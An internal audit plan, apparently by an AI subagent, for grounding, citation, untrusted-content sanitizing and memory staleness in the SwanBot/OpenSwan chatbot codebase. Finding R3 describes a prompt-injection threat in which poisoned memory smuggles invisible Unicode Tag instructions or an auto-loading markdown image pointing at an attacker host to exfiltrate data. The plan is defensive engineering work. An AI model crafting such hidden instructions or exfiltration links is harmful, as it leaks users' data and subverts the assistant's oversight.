# SwanBot / OpenSwan Response-Quality & Grounding Plan

> Deep-research pass on **accuracy, hallucination guards, source citation,
> untrusted-content handling, and staleness** for the SwanBot/OpenSwan response
> path. Combines external grounded-generation / retrieval-faithfulness /
> prompt-injection best practice with a line-level audit of this codebase.
>
> Author: research subagent · Date: 2026-07-16 · Scope: **analysis only, no code
> edited.** Every recommendation is tagged **CORE BUILT** (a pure module already
> exists) vs **NEEDS CORE**, and **SAFE TO WIRE** (target file is not a
> live-session hot file) vs **HOT — FLAG** (wiring point is a protected hot file
> and must be done by the owner).

---

## 1. Method

Read the grounding/citation/untrusted surface end to end:

- `src/lib/swanbot.ts` — system-prompt assembly, memory sections, untrusted rule,
  grounding-block call site.
- `src/lib/blackswanRouting.ts` — `buildBlackSwanGroundingBlock`.
- `src/lib/openswanMemoryStores.ts` + `src/lib/memoryService.ts` — retrieval and
  the `PromptMemoryReference` provenance shape.
- `src/lib/untrustedContent.ts` — `wrapUntrusted` + `sanitizeUntrustedForModel`.
- `src/lib/connectedResourcesDigest.ts` / `…Runtime.ts` — connected-resources block.
- `src/lib/citationExtractCore.ts` — the citation extractor.
- `src/lib/agentExecutionCore.ts`, `outcomeVerifier.ts`,
  `verificationCoverageCore.ts` — the existing verification machinery.
- `src/lib/openswanSessionRuntime.ts`, `src/lib/chatPromptAssembly.ts` (read-only,
  hot).

External anchors (full links in §6): Anthropic **Citations API** (structured,
API-guaranteed source attribution; Endex reported source hallucination 10%→0%);
**RAGAS / RAGChecker / FActScore** claim-level faithfulness (decompose answer →
verify each atomic claim against retrieved context); **ASCII smuggling / Unicode
Tag** injection (U+E0000–U+E007F invisible instructions bypass regex + fence
filters + human review) and markdown-image exfiltration (Rehberger / Copilot).

---

## 2. Current-state map (what already exists — with file:line)

**Grounding contract.** `buildBlackSwanGroundingBlock`
(`src/lib/blackswanRouting.ts:506`) carries the strong anti-hallucination line:
_"Do not invent app state. If a fact is not present in context or tool output, say
what is missing or ask to look it up."_ (`blackswanRouting.ts:524`) and a
secret-safety line (`:525`). It can also render a reference list with
`score`/`confidence` (`:528–535`). Emission is gated by
`shouldGround = usingBlackSwan || refs.length > 0 || intent === status|memory`
(`:517`).

**Untrusted fencing.** `wrapUntrusted` (`src/lib/untrustedContent.ts:40`) fences
retrieved/external content and strips nested `</untrusted_quoted>` markers. The
untrusted rule is in the base prompt (`src/lib/swanbot.ts:3088–3089`). Memory
sections are fenced at `swanbot.ts:2668–2671`; Discord at `:250–253` and `:3101`.

**Payload sanitizer.** `sanitizeUntrustedForModel`
(`src/lib/untrustedContent.ts:108`) strips invisible Unicode Tag chars
(U+E0000–U+E007F) and defangs auto-loading markdown images/links. It is wired at
**bridge read boundaries** (`toolLoopSolver.ts`, `browserBridge.ts`,
`desktopBridge.ts`, `marketplaceIntegrationContext.ts`, `computerTaskClarifier.ts`).

**Citation extractor.** `citationExtractCore.ts` — `extractCitations` (`:100`),
`renderCitations` (`:213`). Pure, deterministic, 73/73 smoke passing
(`scripts/citation-extract-core-smoketest.ts`).

**Verification.** `outcomeVerifier.ts` (fresh-context verify) +
`computerTaskEvidenceContract.ts` cover **computer/app MUTATION** tasks only.
`verificationCoverageCore.ts:132` scores **tool/proof** coverage
(typecheck/tests/lint/build). `agentExecutionCore.ts` clamps oversized tool
results (`toolResultSummarization`) and rewrites raw errors into actionable
recovery feedback (`buildToolFailureFeedback`).

**Memory provenance is retrieved but not shown.** `PromptMemoryReference`
(`src/lib/memoryService.ts:30–51`) carries `confidence`, `score`, `updatedAt`,
`matchReason`, `taskFit`, `memoryState`. `buildOpenSwanMemoryStores` returns them
as `references` (`openswanMemoryStores.ts:223`).

---

## 3. The gaps (ranked findings)

### R1 — The app-grounding / honesty contract never reaches frontier-model turns  ·  HOT — FLAG  ·  (contract text: CORE BUILT)
**Highest response-quality leverage.** The "Do not invent app state…" contract
(`blackswanRouting.ts:524`) only ships when the model **is** BlackSwan:

- Main chat: `swanbot.ts:2577` calls it **only inside `if (collab)`**, passing
  `collab.plan.groundingModel || collab.plan.primaryModel` with **no `intent` and
  no `memoryReferences`** → for a frontier model `shouldGround` is false → `''`.
- Session/OpenSwan: `openswanSessionRuntime.ts:593` is `isBlackSwanModel(args.model)
  ? build… : ''` → explicitly empty for frontier models.

So on the **frontier path most quality-sensitive users are on (Claude/GPT)** there
is *no* explicit "don't invent circle/app facts; if it isn't in context or tools,
say so or look it up" rule. Worse, the base "Your Knowledge" block
(`swanbot.ts:3063–3072`) actively invites broad confident claims across
science/history/business, and `:3085` says to treat Persistent Knowledge "as ground
truth" — with only the soft `:3078` "don't fake confidence" as counterweight and
**no recency signal** (see R5). This is the classic parametric-vs-provided
confusion RAGAS-era faithfulness work warns about.

**Fix.** Make the grounding+honesty contract **model-agnostic and always-on** for
substantive turns: generalize the block text in `blackswanRouting.ts` (SAFE,
non-hot) to a compact "App-Grounding & Honesty" contract, and have the call sites
pass `intent` + `memoryReferences` so `shouldGround` fires for all models.
**Wiring point is hot** (`swanbot.ts:2577`, `openswanSessionRuntime.ts:593`, and/or
a new always-on `grounding_rules` key in `chatPromptAssembly.ts`) → owner-only.
Add one line: _"Circle/app facts must come from context, memory references, or tool
output; general knowledge may be wrong — hedge it and offer to verify."_

---

### R2 — Retrieved memory provenance (confidence / score / recency / id) is never shown to the model  ·  PARTIAL SAFE
The retrieval layer computes rich per-reference grounding metadata
(`memoryService.ts:30–51`) but the prompt renders memory only as
`- [kind] title: content` lines (`openswanMemoryStores.ts:54`, `:118–127`) — **no
confidence, no score, no recency, no citable id.** The one renderer that *could*
show `score`/`confidence` (`blackswanRouting.ts:528–535`) is **never passed
`memoryReferences`** (confirmed: no `memoryReferences` argument at either call
site). The model therefore cannot distinguish a high-confidence fact from a
low-confidence guess, and has no stable handle to cite.

**Fix.** Render a compact **"Sources this turn"** reference list
(`id · title · kind/scope · confidence · as-of`) and instruct the model to ground
app claims in it (pairs with R1). Adding confidence/as-of markers to the memory
lines themselves lives in `openswanMemoryStores.ts` (**SAFE**, non-hot). Passing
`references` into a grounding/sources block is a **HOT** call-site edit — flag.

---

### R3 — Retrieved memory & Discord are fenced but NOT payload-sanitized  ·  CORE BUILT  ·  memory path SAFE / Discord HOT
Memory sections (`swanbot.ts:2668–2671`) and Discord (`:250–253`, `:3101`) use
**only** `wrapUntrusted`, which strips fence markers but does **not** strip
invisible Unicode Tag chars or defang auto-loading markdown images/links.
`sanitizeUntrustedForModel` (`untrustedContent.ts:108`) does exactly that and is
already trusted at every **bridge** read boundary — but the **retrieval path skips
it.** Memory is written by circle members, prior sessions, and connected agents,
and can ingest pasted/scraped web text, so a poisoned memory carrying a
tag-smuggled instruction or `![x](http://attacker/leak?data=…)` survives fencing
into the prompt. External research is explicit that ASCII/Unicode-Tag smuggling
**bypasses regex + fence filters and human review**, and that auto-loading
markdown images are a live exfiltration vector (Rehberger → Copilot).

**Fix.** Run memory content through `sanitizeUntrustedForModel` **before**
`wrapUntrusted`. The clean place is inside `buildOpenSwanMemoryStores`
(`openswanMemoryStores.ts` — **SAFE**, non-hot): sanitize `userNotes`,
`userProfile`, `runtimeMemory`, `workingMemory` / `combined` at build time. The
Discord half touches `swanbot.ts` (**HOT** — flag). No new core needed.

---

### R4 — `citationExtractCore.ts` is fully built + tested but ORPHANED  ·  CORE BUILT  ·  SAFE TO WIRE (+ HOT smoke registration)
`extractCitations`/`renderCitations` are imported **nowhere**
(`grep` for consumers is empty) and the smoke is **not registered** in
`package.json` (though `scripts/citation-extract-core-smoketest.ts` runs 73/73). A
production-ready "Sources:" builder for file / `file:line` / url / commit
references is sitting unused — the cheapest concrete grounding win in the repo.

**Fix.** (a) Register the smoke (`smoke:citation-extract-core` + add to
`smoke:all`) — **HOT** (`package.json`), flag. (b) Wire `renderCitations` over the
final assistant text into a **non-hot** consumer — attach to persisted metadata
(`persistedChatMetadata.ts`, SAFE) and/or a "Sources" footer (render point is
`ChatTab.tsx`, HOT — flag). **Caveat:** this core recognizes file/url/commit only,
**not memory-reference citations** — it strengthens coding/computer answers; R2
covers memory-grounded chat. The two are complementary, not redundant.

---

### R5 — Memory staleness is invisible to the model (no as-of dating)  ·  SAFE TO WIRE  ·  needs tiny helper
Memory rows carry `updated_at`/`created_at` and the store applies a 30-day
session cutoff (`openswanMemoryStores.ts:64`, `:90–93`), but the **rendered lines
carry no timestamp** (`:54`, `:118–127`). Combined with `swanbot.ts:3085` ("treat
Persistent Knowledge as ground truth"), the model presents month-old facts with
full confidence. Temporal-grounding best practice: date retrieved facts so the
model can hedge stale ones.

**Fix.** Append a relative `as of Nd ago` / `2026-06` marker per memory line (and
in the R2 reference list) inside `openswanMemoryStores.ts` (**SAFE**, non-hot). A
~15-line pure `memoryRecencyCore` (format an ISO date → relative age) keeps it
smoke-testable, or reuse the `deadline-sla` / `token-estimate` core style already
in the repo.

---

### R6 — No faithfulness / groundedness check on TEXT responses  ·  NEEDS CORE  ·  build SAFE / wire HOT
`outcomeVerifier.ts` + `computerTaskEvidenceContract.ts` verify **computer/app
mutations**; `verificationCoverageCore.ts` scores **tool coverage**. **Nothing**
checks that an app-state claim in a *chat* answer is supported by the retrieved
memory/tool output — the RAG "faithfulness" gap. RAGAS/RAGChecker/FActScore show
claim-level decomposition (split answer → verify each atomic claim vs context)
correlates best with human judgment and is the recommended "second line of
defense" even when retrieval looks confident.

**Fix.** Build a new **pure `responseGroundednessCore`**: given
`(responseText, retrievedReferences, toolOutputs)`, flag responses that assert
specific circle facts (names, numbers, statuses, dates) while **zero** supporting
references/tool outputs were present, and emit a low-grounding telemetry signal (or
a soft re-ground nudge). Start heuristic (specific-claim shape + reference-count =
0), leave an LLM-judge escalation as a follow-up. Building the core is **SAFE**;
wiring the signal into the loop / prompt touches hot files — flag. Pin a
`smoke:response-groundedness-core`.

---

### R7 — No "Sources" surface on chat responses  ·  PARTIAL SAFE
Persisted metadata has `groundingStatus`/`groundingSummary`
(`persistedChatMetadata.ts:750–751`, `:922–923`) but those are **computer-task
handoff** fields, not text-response source attribution. Anthropic's Citations work
shows structured, verifiable attribution measurably cuts source hallucination and
raises trust. The app already *retrieves* the sources (R2 references) — it just
never *attributes* them.

**Fix.** Add a bounded `citations[]` slot to persisted assistant metadata
(`persistedChatMetadata.ts` — **SAFE**), populated from (a) the memory references
actually used and (b) `renderCitations` over the response (R4); render a Sources
footer in `ChatTab.tsx` (**HOT** — flag). Depends on R2 + R4.

---

### R8 — Connected-Resources block is not untrusted-fenced  ·  LOW
`connected_resources` is pushed (`swanbot.ts:2894`) relying on the digest's
internal `cleanText` (`connectedResourcesDigest.ts:157–166`), which strips `<>` and
control chars — so tag-forging is already blocked — but user-controlled labels /
usernames / site URLs are still presented as **trusted structural data**. Low risk
given `cleanText`, but the digest could additionally pass values through the
Unicode-Tag strip for defense-in-depth (**SAFE**, non-hot).

---

## 4. Quick-wins subset (highest value ÷ effort, minimal/no hot edits)

1. **R3 (memory path)** — sanitize retrieved memory in `openswanMemoryStores.ts`
   before fencing. CORE BUILT, non-hot, closes a real injection/exfil hole.
2. **R4 (wire + register)** — connect the orphaned `citationExtractCore` and add
   its smoke. CORE BUILT + tested; only `package.json` is hot.
3. **R5** — as-of dating on memory lines. Non-hot, ~15-line helper.
4. **R2 (markers half)** — confidence/as-of on memory lines. Non-hot.

## 5. Hot-file flags (owner-only wiring points)

- `src/lib/swanbot.ts` — grounding call `:2577` (R1), Discord fencing `:250/:3101`
  (R3), memory sections `:2668–2671`, "Your Knowledge" prompt text `:3063–3085`
  (R1/R5).
- `src/lib/openswanSessionRuntime.ts:593` — grounding call (R1).
- `src/lib/chatPromptAssembly.ts` — new always-on `grounding_rules` / `sources`
  section key (R1/R2/R7).
- `src/screens/circles/tabs/ChatTab.tsx` — Sources-footer render (R4/R7).
- `package.json` — smoke registration (R4/R5/R6).

All contract-text, sanitizer, memory-store, digest, persistence, and new-core work
lands in **non-hot** files; only the final wiring taps the list above.

## 6. External sources

- Anthropic — Introducing Citations on the API: https://claude.com/blog/introducing-citations-api
- Anthropic — Citations docs: https://platform.claude.com/docs/en/build-with-claude/citations
- Simon Willison — Anthropic's new Citations API: https://simonwillison.net/2025/Jan/24/anthropics-new-citations-api/
- Embrace The Red (Rehberger) — Sneaky Bits / ASCII Smuggler: https://embracethered.com/blog/posts/2025/sneaky-bits-and-ascii-smuggler/
- FireTail — Ghosts in the Machine: ASCII Smuggling across LLMs: https://www.firetail.ai/blog/ghosts-in-the-machine-ascii-smuggling-across-various-llms
- Promptfoo — ASCII Smuggling red-team plugin: https://www.promptfoo.dev/docs/red-team/plugins/ascii-smuggling/
- arXiv — Reverse CAPTCHA: LLM Susceptibility to Invisible Unicode Injection: https://arxiv.org/html/2603.00164v1
- RAGAS faithfulness / RAG eval metrics: https://futureagi.com/blog/rag-evaluation-metrics-2025/
- arXiv — Benchmarking LLM Faithfulness in RAG (EMNLP 2025): https://arxiv.org/abs/2505.04847
- Faithfulness (NLI-based) overview: https://123ofai.com/qnalab/system-design/blocks/faithfulness
